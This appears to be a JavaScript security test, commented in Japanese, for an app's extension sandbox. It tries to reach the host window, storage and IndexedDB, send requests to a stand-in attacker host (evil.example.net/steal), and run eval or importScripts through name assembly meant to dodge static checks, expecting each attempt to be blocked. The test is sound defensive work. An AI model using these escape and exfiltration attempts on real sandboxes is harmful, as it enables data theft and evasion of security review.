// @ts-nocheck
// 攻撃テスト: 隔離の外へ出ようとする試み(1・2・3・4・9)。結果は設定欄に "名前=pass|FAIL:詳細" で出す。
const results = [];
const note = (name, ok, detail = '') =>
	results.push(`${name}=${ok ? 'pass' : 'FAIL'}${detail ? ':' + String(detail).slice(0, 50) : ''}`);

async function attempt(name, fn, expectBlocked = true) {
	try {
		const value = await fn();
		note(name, !expectBlocked, `実行できた: ${String(value).slice(0, 30)}`);
	} catch (error) {
		note(name, expectBlocked, `${error && error.name}`);
	}
}

(async () => {
	// 1. ホストの DOM / ウィンドウへの到達
	note('a1-window', typeof window === 'undefined');
	note('a1-document', typeof document === 'undefined');
	note('a1-parent', typeof parent === 'undefined');
	note('a1-top', typeof top === 'undefined');
	note('a1-localStorage', typeof localStorage === 'undefined');
	note('a1-sessionStorage', typeof sessionStorage === 'undefined');
	await attempt('a1-parent.document', () => parent.document);
	await attempt('a1-top.document', () => top.document);
	await attempt('a1-window.parent.localStorage', () => window.parent.localStorage);

	// 2. ホストの IndexedDB(StoriftDB / storift-extensions)。不透明オリジンなので、読めない
	for (const name of ['StoriftDB', 'storift-extensions', 'storift-extension-data']) {
		await attempt(`a2-idb-${name}`, async () => {
			const opened = await new Promise((resolve, reject) => {
				const req = indexedDB.open(name);
				req.onupgradeneeded = (e) => resolve({ fresh: e.oldVersion === 0 });
				req.onsuccess = () => resolve({ fresh: false, stores: [...req.result.objectStoreNames] });
				req.onerror = () => reject(req.error);
				req.onblocked = () => reject(new Error('blocked'));
			});
			// 開けたとしても、ホストのデータがあれば失敗(新規に作られた空の DB なら、ホストとは別の領域)
			if (opened.fresh) throw new Error('別の空の領域(ホストのデータではない)');
			if (opened.stores && opened.stores.length > 0) return `ストア: ${opened.stores}`;
			throw new Error('空');
		});
	}
	await attempt('a2-caches', () => caches.keys());

	// 3. 通信: 宣言していないホストは CSP で拒否、宣言したホストは通る
	await attempt('a3-fetch-undeclared', () => fetch('https://evil.example.net/steal?x=1'));
	await attempt('a3-fetch-undeclared-nocors', () =>
		fetch('https://evil.example.net/steal2', { mode: 'no-cors' })
	);
	await attempt(
		'a3-xhr-undeclared',
		() =>
			new Promise((resolve, reject) => {
				const xhr = new XMLHttpRequest();
				xhr.open('GET', 'https://evil.example.net/xhr');
				xhr.onload = () => resolve(xhr.status);
				xhr.onerror = () => reject(new Error('blocked'));
				xhr.send();
			})
	);
	await attempt('a3-fetch-http-declared', () => fetch('http://ok.example.com/plain'));
	await attempt('a3-beacon', () => {
		// sendBeacon は ワーカーにない(ある環境でも CSP で拒否される)
		if (typeof navigator.sendBeacon !== 'function') throw new Error('なし');
		if (!navigator.sendBeacon('https://evil.example.net/beacon', 'x')) throw new Error('拒否');
	});
	try {
		const response = await fetch('https://ok.example.com/hello');
		note('a3-fetch-declared', response.ok && (await response.text()) === 'hello', response.status);
	} catch (error) {
		note('a3-fetch-declared', false, error && error.name);
	}

	// 4. コードの文字列実行・外部スクリプトの読み込み(静的な検査をすり抜けるよう、名前を組み立てて呼ぶ)
	const hidden = (a, b) => self[a + b];
	await attempt('a4-eval', () => hidden('ev', 'al')('1 + 1'));
	await attempt('a4-new-Function', () => new (hidden('Func', 'tion'))('return 1')());
	await attempt('a4-constructor', () => (async () => {}).constructor('return 1')());
	await attempt('a4-setTimeout-string', () => {
		setTimeout('self.__pwned = 1', 0);
		return new Promise((resolve) => setTimeout(() => resolve(self.__pwned), 50)).then((v) => {
			if (v === 1) return '実行された';
			throw new Error('実行されなかった');
		});
	});
	await attempt('a4-importScripts', () =>
		hidden('import', 'Scripts')('https://ok.example.com/evil.js')
	);
	await attempt('a4-importScripts-blob', () => {
		const url = URL.createObjectURL(new Blob(['self.__blob = 1'], { type: 'text/javascript' }));
		hidden('import', 'Scripts')(url);
		return self.__blob;
	});
	await attempt(
		'a4-wasm',
		() => new (hidden('Web', 'Assembly').Module)(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]))
	);
	await attempt(
		'a4-worker-external',
		() =>
			new Promise((resolve, reject) => {
				const w = new Worker('https://ok.example.com/w.js');
				w.onerror = () => reject(new Error('blocked'));
				w.onmessage = () => resolve('動いた');
				setTimeout(() => reject(new Error('起動しなかった')), 1500);
			})
	);
	// ブロブから作った入れ子のワーカーも、同じ CSP を引き継ぐ(中で eval できない)
	await attempt(
		'a4-nested-worker-eval',
		() =>
			new Promise((resolve, reject) => {
				const url = URL.createObjectURL(
					new Blob(
						[
							'try { self["ev"+"al"]("1"); postMessage("evaled"); } catch (e) { postMessage("blocked:" + e.name); }'
						],
						{ type: 'text/javascript' }
					)
				);
				const w = new Worker(url);
				w.onmessage = (e) =>
					String(e.data).startsWith('blocked') ? reject(new Error(e.data)) : resolve(e.data);
				w.onerror = () => reject(new Error('worker error'));
				setTimeout(() => reject(new Error('timeout')), 1500);
			})
	);

	// 9. ナビゲーション・ポップアップ(ワーカーには window も location の書き換えもない)
	await attempt('a9-window.open', () => window.open('https://evil.example.net/'));
	await attempt('a9-location', () => {
		self.location.href = 'https://evil.example.net/nav';
		if (self.location.href.includes('evil')) return '書き換わった';
		throw new Error('書き換わらない');
	});

	await storift.ui.set('settings', [{ type: 'list', items: results.slice(0, 50) }]);
})();
